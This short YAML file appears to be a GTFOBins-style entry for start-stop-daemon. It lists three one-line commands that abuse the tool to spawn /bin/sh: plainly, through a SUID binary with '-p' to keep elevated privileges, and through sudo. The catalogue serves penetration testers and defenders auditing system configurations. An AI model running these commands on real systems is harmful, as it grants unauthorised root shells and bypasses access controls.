---
functions:
  shell:
    - code: start-stop-daemon -n $RANDOM -S -x /bin/sh
  suid:
    - code: ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
  sudo:
    - code: sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
---
